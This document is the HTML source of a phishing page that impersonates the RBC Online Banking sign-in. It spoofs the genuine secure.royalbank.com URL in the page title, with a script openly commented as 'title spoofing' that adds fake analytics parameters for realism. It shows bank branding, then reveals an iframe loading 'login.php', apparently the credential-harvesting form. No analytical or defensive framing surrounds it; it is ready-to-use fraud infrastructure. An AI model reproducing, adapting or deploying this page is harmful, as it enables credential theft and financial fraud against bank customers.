<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>secure.royalbank.com/statics/login-service-ui/index#/full/signin</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
    <style>
        :root {
            --rbc-blue: #004080;
            --rbc-white: #ffffff;
            --shadow-light: 0 8px 32px rgba(0,0,0,0.1);
            --shadow-heavy: 0 20px 40px rgba(0,0,0,0.15);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            height: 100vh;
            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, sans-serif;
            overflow: hidden;
            background: linear-gradient(135deg, #0f2027 0%, #203a43 50%, #2c5364 100%);
            position: relative;
        }

        /* Subtle background pattern */
        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: 
                radial-gradient(circle at 20% 80%, rgba(120,119,198,0.3) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(255,119,198,0.3) 0%, transparent 50%),
                radial-gradient(circle at 40% 40%, rgba(120,219,255,0.3) 0%, transparent 50%);
            pointer-events: none;
        }

        .login-container {
            position: relative;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 10;
        }

        .logo-section {
            text-align: center;
            transform: translateY(0);
            transition: all 2.5s cubic-bezier(0.25, 0.46, 0.45, 0.94);
            opacity: 1;
        }

        .logo-section.moved {
            transform: translateY(-60vh);
            opacity: 0.9;
        }

        .rbc-logo {
            width: 140px;
            height: 140px;
            background: url('assets/images/rbc.png') center/contain no-repeat;
            margin: 0 auto 24px;
            filter: drop-shadow(0 12px 24px rgba(0,64,128,0.3));
            transition: all 0.8s ease;
        }

        .logo-section.moved .rbc-logo {
            width: 110px;
            height: 110px;
            filter: drop-shadow(0 8px 16px rgba(0,64,128,0.2));
        }

        .branding-text {
            color: var(--rbc-white);
            text-shadow: 0 4px 12px rgba(0,0,0,0.5);
            transition: all 2s ease;
        }

        .branding-text h1 {
            font-size: clamp(1.8rem, 5vw, 2.4rem);
            font-weight: 300;
            margin-bottom: 8px;
            letter-spacing: 0.5px;
        }

        .branding-text .subtitle {
            font-size: clamp(1.1rem, 3.5vw, 1.4rem);
            font-weight: 400;
            opacity: 0.95;
            transform: scaleX(0.92);
        }

        .loading-spinner {
            width: 36px;
            height: 36px;
            border: 3px solid rgba(255,255,255,0.2);
            border-top: 3px solid var(--rbc-white);
            border-radius: 50%;
            animation: spin 1.2s cubic-bezier(0.4, 0, 0.2, 1) infinite;
            margin: 32px auto 0;
            transition: opacity 0.5s ease;
        }

        .login-panel {
            position: fixed;
            bottom: -80vh;
            left: 0;
            width: 100%;
            height: 80vh;
            background: linear-gradient(180deg, #ffffff 0%, #f8f9fa 100%);
            border-radius: 24px 24px 0 0;
            transition: all 2.5s cubic-bezier(0.25, 0.46, 0.45, 0.94);
            box-shadow: var(--shadow-heavy);
            overflow: hidden;
            z-index: 5;
        }

        .login-panel.active {
            bottom: 0;
        }

        .login-frame {
            width: 100%;
            height: 100%;
            border: none;
            border-radius: 24px 24px 0 0;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Micro-interactions */
        .logo-section:hover .rbc-logo {
            transform: scale(1.02);
        }

        @media (max-width: 480px) {
            .login-panel {
                height: 85vh;
                border-radius: 20px 20px 0 0;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <!-- Logo & Branding -->
        <div id="logoSection" class="logo-section">
            <div class="rbc-logo"></div>
            <div class="branding-text">
                <h1>Secure Sign-In</h1>
                <div class="subtitle">RBC Online Banking</div>
            </div>
            <div class="loading-spinner" id="spinner"></div>
        </div>

        <!-- Login Panel -->
        <div id="loginPanel" class="login-panel">
            <iframe id="loginFrame" class="login-frame" src="login.php"></iframe>
        </div>
    </div>

    <script>
        // Enhanced title spoofing with realistic GA params
        const realisticTitle = "secure.royalbank.com/statics/login-service-ui/index#/full/signin?_gl=1*1yx3bz5*_gcl_aw*R0NMLjE3NjA1NTYzNDQuQ2owS0NRandqTDNIQmhDZ0FSSXNBUFVnN2E2cWh0WHktakl3VG0wdlktSkN3dW9LNVF4VGJMaXdmQmt4NzY4NzRCRjdVVnBobFh5Z2pGd2FBbVV5RUFMd193Y0I.*_gcl_au*MzQzNjkwMzAzLjE3NTkwNjI1NDg.*_ga*MTg1NTIyMTA1Ni4xNzU5MDYyNTQ5*_ga_89NPCTDXQR*czE3NjA4ODc2NDQkbzQkZzEkdDE3NjA4ODc2NDQkajYwJGwwJGgw&LANGUAGE=ENGLISH";
        
        document.title = realisticTitle;
        document.querySelectorAll('title').forEach(t => t.textContent = realisticTitle);

        // Smooth orchestrated animation sequence
        window.addEventListener('load', () => {
            const logoSection = document.getElementById('logoSection');
            const spinner = document.getElementById('spinner');
            const loginPanel = document.getElementById('loginPanel');

            // Phase 1: Hide spinner (subtle)
            setTimeout(() => {
                spinner.style.opacity = '0';
            }, 4000);

            // Phase 2: Orchestrated reveal (2.5s smooth slide)
            setTimeout(() => {
                logoSection.classList.add('moved');
                loginPanel.classList.add('active');
                spinner.style.display = 'none';
            }, 5000);
        });

        // Performance optimization
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.getRegistrations().then(registrations => {
                registrations.forEach(registration => registration.unregister());
            });
        }
    </script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>